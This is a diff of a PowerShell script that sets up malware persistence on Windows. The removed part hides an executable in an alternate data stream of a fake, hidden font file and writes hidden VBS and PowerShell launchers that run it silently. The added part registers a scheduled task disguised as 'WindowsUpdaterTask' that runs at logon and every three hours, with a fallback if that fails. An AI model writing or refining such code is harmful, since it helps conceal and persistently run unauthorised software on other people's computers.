@@ -1,67 +1,50 @@
-$ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'SilentlyContinue'
-
-param($args)
-
-$agentPath = $env:AgentPath
-if (-not $agentPath) {
-    Write-Output "❌ AgentPath not set."
-    exit
-}
-
-# ---- 1. Fake font file & ADS ----
-$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
-if (-not (Test-Path $fontDir)) {
-    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
-    attrib +h $fontDir
-}
-$fontFile = "$fontDir\seguibl.ttf"
-if (-not (Test-Path $fontFile)) {
-    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
-    attrib +h $fontFile
-}
-
-$streamName = "Zone.Identifier"
-$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
-Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
-
-# ---- 2. Launcher scripts ----
-$launcherPath = "$fontDir\run.ps1"
-$launcherContent = @"
-`$ProgressPreference = 'SilentlyContinue'
-`$fontFile = '$fontFile'
-`$streamName = '$streamName'
-`$tempAgent = "`$env:TEMP\agent.exe"
-if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
-`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
-if (`$bytes) {
-    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
-    Start-Process -WindowStyle Hidden `$tempAgent
-}
-"@
-Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
-attrib +h $launcherPath
-
-$vbsPath = "$fontDir\run.vbs"
-$vbsContent = @"
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
-"@
-Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
-attrib +h $vbsPath
-
-# ---- 3. Scheduled task (logon + every 3 hours) ----
+# ---- 3. Scheduled task using PowerShell cmdlets ----
 $taskName = "WindowsUpdaterTask"
+$taskCreated = $false
 
-# Delete any existing task with the same name
-schtasks /delete /tn $taskName /f *>$null 2>&1
+# Delete existing task if any
+try {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+} catch {}
 
-# Create the task: runs at logon and repeats every 3 hours indefinitely
-$createCmd = "schtasks /create /tn `"$taskName`" /tr `"wscript.exe `"$vbsPath`"`" /sc onlogon /ru $env:USERNAME /f /it /ri PT3H /du 9999:59"
-Invoke-Expression $createCmd *>$null 2>&1
+# Create the action (runs VBS)
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
 
-if ($LASTEXITCODE -eq 0) {
-    Write-Output "✅ Persistence installed: task '$taskName' will run at logon and every 3 hours."
-} else {
-    Write-Output "❌ schtasks failed with exit code $LASTEXITCODE."
+# Trigger 1: At logon
+$logonTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+
+# Trigger 2: Every 3 hours, starting from now, repeating indefinitely
+$repeatTrigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Hours 3) -RepetitionDuration ([TimeSpan]::MaxValue)
+
+# Combine triggers
+$triggers = @($logonTrigger, $repeatTrigger)
+
+# Principal (run as current user, only when logged on)
+$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
+
+# Settings (allow multiple instances? Your agent has mutex, so keep default)
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
+
+# Register the task
+try {
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Principal $principal -Settings $settings -Force -ErrorAction Stop
+    $taskCreated = $true
+    Write-Output "✅ Task '$taskName' created with logon + every-3-hour triggers (PowerShell cmdlets)."
+} catch {
+    Write-Output "❌ PowerShell cmdlet failed: $($_.Exception.Message)"
+    
+    # Fallback: create a simple logon-only task (better than nothing)
+    try {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        $simpleTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $simpleTrigger -Principal $principal -Settings $settings -Force
+        $taskCreated = $true
+        Write-Output "⚠️ Repetition failed, but logon persistence installed (runs once per boot)."
+    } catch {
+        Write-Output "❌ Fallback also failed: $($_.Exception.Message)"
+    }
+}
+
+if (-not $taskCreated) {
+    Write-Output "❌ Persistence failed. Run PowerShell as administrator or check Task Scheduler service."
 }
